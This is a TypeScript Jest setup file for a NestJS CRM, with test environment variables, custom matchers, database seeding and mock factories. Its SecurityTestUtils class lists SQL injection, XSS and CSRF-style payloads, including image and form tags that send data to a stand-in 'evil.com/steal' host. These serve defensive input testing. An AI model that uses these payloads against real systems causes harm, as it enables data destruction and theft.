/**
 * Enterprise Testing Setup
 * Comprehensive test environment configuration for mission-critical CRM
 */

import { Test } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import { PrismaService } from '../../src/prisma/prisma.service';
import { JwtService } from '@nestjs/jwt';
import { ConfigService } from '@nestjs/config';

// Global test configuration
beforeAll(async () => {
  // Set test environment variables
  process.env.NODE_ENV = 'test';
  process.env.JWT_SECRET = 'enterprise-test-jwt-secret-key-256-bit';
  process.env.SUPABASE_URL = 'https://test-enterprise.supabase.co';
  process.env.SUPABASE_ANON_KEY = 'test-enterprise-anon-key';
  process.env.SUPABASE_SERVICE_ROLE_KEY = 'test-enterprise-service-role-key';
  process.env.SUPABASE_SECRET_KEY = 'test-enterprise-secret-key';
  process.env.DATABASE_URL = 'postgresql://test:test@localhost:5432/verosuite_test';
  process.env.REDIS_URL = 'redis://localhost:6379/1';
  process.env.ENCRYPTION_KEY = 'test-encryption-key-32-chars';
  
  // Performance monitoring
  process.env.PERFORMANCE_MONITORING = 'true';
  process.env.SECURITY_SCANNING = 'true';
  process.env.ACCESSIBILITY_TESTING = 'true';
});

// Global test utilities
declare global {
  namespace jest {
    interface Matchers<R> {
      toBeValidJWT(): R;
      toHaveValidTenantId(): R;
      toBeSecureResponse(): R;
      toHaveValidPermissions(): R;
      toMeetPerformanceThreshold(threshold: number): R;
      toBeAccessible(): R;
    }
  }
}

// Custom Jest matchers for enterprise testing
expect.extend({
  toBeValidJWT(received: string) {
    const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/;
    const isValid = jwtRegex.test(received);
    
    return {
      message: () => `expected ${received} to be a valid JWT token`,
      pass: isValid
    };
  },

  toHaveValidTenantId(received: any) {
    const hasValidTenantId = received && 
      typeof received.tenant_id === 'string' && 
      received.tenant_id.length > 0;
    
    return {
      message: () => `expected object to have valid tenant_id`,
      pass: hasValidTenantId
    };
  },

  toBeSecureResponse(received: any) {
    const hasSecurityHeaders = received && 
      received.headers &&
      received.headers['x-content-type-options'] === 'nosniff' &&
      received.headers['x-frame-options'] === 'DENY' &&
      received.headers['x-xss-protection'] === '1; mode=block';
    
    return {
      message: () => `expected response to have security headers`,
      pass: hasSecurityHeaders
    };
  },

  toHaveValidPermissions(received: any, permissions: string[]) {
    const hasPermissions = permissions.every(permission => 
      received.permissions && received.permissions.includes(permission)
    );
    
    return {
      message: () => `expected user to have permissions: ${permissions.join(', ')}`,
      pass: hasPermissions
    };
  },

  toMeetPerformanceThreshold(received: number, threshold: number) {
    const meetsThreshold = received <= threshold;
    
    return {
      message: () => `expected ${received}ms to be <= ${threshold}ms`,
      pass: meetsThreshold
    };
  },

  toBeAccessible(received: any) {
    // Basic accessibility checks
    const hasAriaLabels = received.querySelectorAll('[aria-label]').length > 0;
    const hasAltText = received.querySelectorAll('img[alt]').length > 0;
    const hasHeadings = received.querySelectorAll('h1, h2, h3, h4, h5, h6').length > 0;
    
    return {
      message: () => `expected element to be accessible`,
      pass: hasAriaLabels || hasAltText || hasHeadings
    };
  }
});

// Test database utilities
export class TestDatabase {
  private static instance: TestDatabase;
  private prisma: PrismaService;

  static getInstance(): TestDatabase {
    if (!TestDatabase.instance) {
      TestDatabase.instance = new TestDatabase();
    }
    return TestDatabase.instance;
  }

  async setup() {
    const moduleRef = await Test.createTestingModule({
      providers: [PrismaService]
    }).compile();
    
    this.prisma = moduleRef.get<PrismaService>(PrismaService);
    await this.prisma.$connect();
  }

  async cleanup() {
    if (this.prisma) {
      await this.prisma.$disconnect();
    }
  }

  async seedTestData() {
    // Seed test data for comprehensive testing
    const testTenant = await this.prisma.tenant.create({
      data: {
        id: 'test-tenant-enterprise',
        name: 'Enterprise Test Tenant',
        domain: 'test-enterprise.com',
        settings: {
          features: ['crm', 'work_orders', 'technicians', 'analytics'],
          security: {
            mfa_required: true,
            session_timeout: 3600,
            password_policy: 'strong'
          }
        }
      }
    });

    const testUser = await this.prisma.user.create({
      data: {
        id: 'test-user-enterprise',
        email: 'enterprise-test@verosuite.com',
        tenant_id: testTenant.id,
        role: 'admin',
        permissions: [
          'manage_customers',
          'manage_work_orders',
          'manage_technicians',
          'view_analytics',
          'admin_access'
        ],
        profile: {
          first_name: 'Enterprise',
          last_name: 'Tester',
          phone: '+1-555-0123'
        }
      }
    });

    return { testTenant, testUser };
  }

  async clearTestData() {
    // Clean up test data
    await this.prisma.user.deleteMany({
      where: { tenant_id: 'test-tenant-enterprise' }
    });
    await this.prisma.tenant.deleteMany({
      where: { id: 'test-tenant-enterprise' }
    });
  }
}

// Security testing utilities
export class SecurityTestUtils {
  static generateMaliciousPayloads() {
    return {
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ],
      xssPayloads: [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
      ],
      csrfPayloads: [
        "<form action='http://evil.com/steal' method='POST'>",
        "<img src='http://evil.com/steal?data=secret'>"
      ]
    };
  }

  static generateInvalidTokens() {
    return {
      expired: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid',
      malformed: 'invalid.jwt.token',
      tampered: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.tampered'
    };
  }
}

// Performance testing utilities
export class PerformanceTestUtils {
  static async measureExecutionTime<T>(fn: () => Promise<T>): Promise<{ result: T; duration: number }> {
    const start = performance.now();
    const result = await fn();
    const duration = performance.now() - start;
    return { result, duration };
  }

  static generateLoadTestData(size: number) {
    return Array.from({ length: size }, (_, i) => ({
      id: `test-${i}`,
      name: `Test Item ${i}`,
      email: `test${i}@example.com`,
      created_at: new Date().toISOString()
    }));
  }
}

// Mock factories for consistent test data
export class MockFactory {
  static createUser(overrides: any = {}) {
    return {
      id: 'mock-user-id',
      email: 'mock@example.com',
      tenant_id: 'mock-tenant-id',
      role: 'dispatcher',
      permissions: ['manage_customers', 'view_work_orders'],
      profile: {
        first_name: 'Mock',
        last_name: 'User',
        phone: '+1-555-0000'
      },
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      ...overrides
    };
  }

  static createCustomer(overrides: any = {}) {
    return {
      id: 'mock-customer-id',
      first_name: 'Mock',
      last_name: 'Customer',
      email: 'customer@example.com',
      phone: '+1-555-0001',
      address: '123 Mock Street',
      city: 'Mock City',
      state: 'MC',
      zip_code: '12345',
      tenant_id: 'mock-tenant-id',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      ...overrides
    };
  }

  static createWorkOrder(overrides: any = {}) {
    return {
      id: 'mock-work-order-id',
      customer_id: 'mock-customer-id',
      technician_id: 'mock-technician-id',
      status: 'scheduled',
      priority: 'medium',
      service_type: 'pest_control',
      scheduled_date: new Date().toISOString(),
      description: 'Mock work order description',
      tenant_id: 'mock-tenant-id',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      ...overrides
    };
  }
}

// Global test hooks
beforeEach(async () => {
  // Reset all mocks before each test
  jest.clearAllMocks();
  jest.resetAllMocks();
});

afterEach(async () => {
  // Clean up after each test
  jest.restoreAllMocks();
});

afterAll(async () => {
  // Global cleanup
  const testDb = TestDatabase.getInstance();
  await testDb.cleanup();
});

// Export utilities for use in tests
export {
  TestDatabase,
  SecurityTestUtils,
  PerformanceTestUtils,
  MockFactory
};






